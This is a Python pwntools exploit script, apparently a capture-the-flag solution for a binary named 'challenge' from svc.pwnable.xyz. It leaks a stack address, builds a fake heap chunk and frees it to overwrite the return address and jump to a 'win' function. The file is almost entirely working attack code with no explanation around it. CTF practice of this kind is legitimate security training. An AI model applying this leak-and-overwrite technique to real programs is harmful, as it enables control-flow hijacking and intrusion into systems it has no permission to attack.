#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template challenge
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('challenge')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
#b *0x004007ee
#b *0x00400830
#b *0x00400823
#b *0x004008bd
b *0x00400870
b *0x0040085d
b *0x00400884
b *main+289
b *main+253
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# FORTIFY:  Enabled

#context.log_level = 'debug'

io = start()
#io = remote('svc.pwnable.xyz', 30005)

def get_leak():
    io.sendafter(b'> ', b'2')
    leak = int(io.recvline().rstrip(), 16)
    return leak

def read_data(data):
    io.sendafter(b'> ', b'1')
    io.sendline(data)

def free():
    io.sendafter(b'> ', b'0')

leak = get_leak()
ret = leak+88

print(f'[+] Leak: {hex(leak)}')
print(f'[+] Ret: {hex(ret)}')
win = 0x00400a3e

io.sendafter(b'> ', b'1')
time.sleep(0.5)
io.send(p64(0xdeadbeef)+p64(leak+72))
io.sendafter(b'> ', b'3') # shift to rip-0x10

io.sendafter(b'> ', b'1')
time.sleep(0.5)
io.send(p64(0x31)+p64(leak)+p64(win)) # overwrite rip-0x10, rip-0x8, rip respectively
io.sendafter(b'> ', b'3')
free() # free after getting a fake chunk set up

io.interactive()

